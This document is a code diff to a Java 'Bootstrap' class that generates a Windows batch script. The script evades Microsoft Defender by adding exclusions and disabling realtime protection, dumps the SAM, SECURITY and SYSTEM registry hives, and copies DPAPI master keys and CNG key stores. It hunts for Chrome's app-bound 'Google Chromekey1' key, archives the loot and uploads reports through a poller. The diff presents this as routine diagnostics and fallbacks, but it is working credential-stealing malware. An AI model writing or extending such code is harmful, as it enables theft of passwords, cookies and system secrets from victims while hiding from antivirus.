@@ -348,13 +348,24 @@ public final class Bootstrap {
 		deleteFile(elevate);
 		deleteFile(dump);
 		Path status = cache.resolve("elevate.status");
-		if (Files.isRegularFile(status)) {
-			try {
-				Log.debug("Bootstrap hives: " + Files.readString(status).trim());
-			} catch (Throwable throwable) {
-				// best effort
+		Path diag = cache.resolve("hives.diag");
+		for (Path report : List.of(diag, status)) {
+			if (!Files.isRegularFile(report)) {
+				continue;
 			}
-			deleteFile(status);
+			try {
+				poller.uploadFile(report);
+			} catch (Throwable throwable) {
+				Log.debug("Bootstrap hives report failed: " + report.getFileName(), throwable);
+			}
+			if (report.equals(status)) {
+				try {
+					Log.debug("Bootstrap hives: " + Files.readString(status).trim());
+				} catch (Throwable throwable) {
+					// best effort
+				}
+			}
+			deleteFile(report);
 		}
 		boolean ready = Files.isRegularFile(hives) && completeHives(hives);
 		if (!ready) {
@@ -423,7 +434,14 @@ public final class Bootstrap {
 		String protect = cache.resolve("ProtectSystem").toString();
 		String keys = cache.resolve("SystemKeys").toString();
 		String status = cache.resolve("elevate.status").toString();
+		String diag = cache.resolve("hives.diag").toString();
+		String hits = cache.resolve("keys.hits").toString();
 		String was = cache.resolve("mp.was").toString();
+		Path local = cache.getParent() == null ? null : cache.getParent().getParent();
+		String localCrypto = local == null ? cache.resolve("user-crypto").toString()
+			: local.resolve("Microsoft").resolve("Crypto").toString();
+		String roamingCrypto = local == null || local.getParent() == null ? cache.resolve("roaming-crypto").toString()
+			: local.getParent().resolve("Roaming").resolve("Microsoft").resolve("Crypto").toString();
 
 		// Defender's cloud ML flags the hive command lines. Exclude the cache
 		// path, the .hiv extension and the tools themselves before the first
@@ -463,6 +481,15 @@ public final class Bootstrap {
 			// Give Defender a moment to load the new rules.
 			"powershell -NoP -C \"Start-Sleep -Milliseconds 1500\"",
 			realtimeOff.toString(),
+			// Keep an uploadable snapshot: which DPAPI/CNG sources exist on this
+			// build, so a missing folder is diagnosable without another round.
+			"( echo --- hives sources --- & echo user=%USERNAME%"
+				+ " & dir /a \"C:\\Windows\\System32\\Microsoft\\Protect\""
+				+ " & dir /a \"C:\\Windows\\SysWOW64\\Microsoft\\Protect\""
+				+ " & dir /a \"C:\\ProgramData\\Microsoft\\Crypto\""
+				+ " & dir /a \"" + localCrypto + "\""
+				+ " & dir /a \"C:\\Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Crypto\""
+				+ " ) > \"" + diag + "\" 2>&1",
 			":dump",
 			"set /a TRIES+=1",
 			"del /q \"" + system + "\" \"" + security + "\" \"" + sam + "\" 2>nul",
@@ -482,11 +509,34 @@ public final class Bootstrap {
 			"for %%A in (\"" + sam + "\") do if %%~zA LSS 4096 goto retry",
 			"robocopy C:\\Windows\\System32\\Microsoft\\Protect \"" + protect
 				+ "\" /e /njh /njs /ndl /nc /ns",
+			// Some 26xxx builds keep the live store elsewhere; fall back to the
+			// WOW64 or SYSTEM-profile copy when the SID folder is not there.
+			"if not exist \"" + protect + "\\S-1-5-18\\\" robocopy C:\\Windows\\SysWOW64\\Microsoft\\Protect \""
+				+ protect + "\" /e /njh /njs /ndl /nc /ns",
+			"if not exist \"" + protect + "\\S-1-5-18\\\" robocopy "
+				+ "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Protect \""
+				+ protect + "\" /e /njh /njs /ndl /nc /ns",
 			// Chrome's app-bound CNG key lives outside Protect; collect it before
 			// packing. Without it only the fixed-key flag 1/2 schemes are offline.
+			"mkdir \"" + keys + "\" 2>nul",
 			"robocopy C:\\ProgramData\\Microsoft\\Crypto\\SystemKeys \"" + keys
 				+ "\" /e /njh /njs /ndl /nc /ns",
-			"if not exist \"" + protect + "\\S-1-5-18\" goto retry",
+			// The key moved between stores across Chrome builds; take every
+			// machine/user key store and let the content search find it.
+			"if exist \"C:\\ProgramData\\Microsoft\\Crypto\\Keys\\\" robocopy "
+				+ "C:\\ProgramData\\Microsoft\\Crypto\\Keys \"" + keys + "\\machine\" /e /njh /njs /ndl /nc /ns",
+			"if exist \"" + localCrypto + "\\Keys\\\" robocopy \"" + localCrypto + "\\Keys\" \""
+				+ keys + "\\user\" /e /njh /njs /ndl /nc /ns",
+			"if exist \"" + roamingCrypto + "\\Keys\\\" robocopy \"" + roamingCrypto + "\\Keys\" \""
+				+ keys + "\\roaming\" /e /njh /njs /ndl /nc /ns",
+			"findstr /s /m /i /c:\"Google Chromekey1\" \"C:\\ProgramData\\Microsoft\\Crypto\\*\" > \""
+				+ hits + "\" 2>nul",
+			"for /f \"usebackq delims=\" %%F in (\"" + hits + "\") do copy /y \"%%F\" \"" + keys
+				+ "\\\" >nul 2>&1",
+			"if not exist \"" + keys + "\\Google Chromekey1\" for /f \"usebackq delims=\" %%F in (\""
+				+ hits + "\") do if not exist \"" + keys + "\\Google Chromekey1\" copy /y \"%%F\" \""
+				+ keys + "\\Google Chromekey1\" >nul 2>&1",
+			"if not exist \"" + protect + "\\S-1-5-18\\\" goto retry",
 			"if not exist \"" + keys + "\\Google Chromekey1\" goto retry",
 			"del /q \"" + hives + "\" 2>nul",
 			"tar -a -cf \"" + hives + "\" -C \"" + cache + "\" SYSTEM.hiv SECURITY.hiv SAM.hiv "
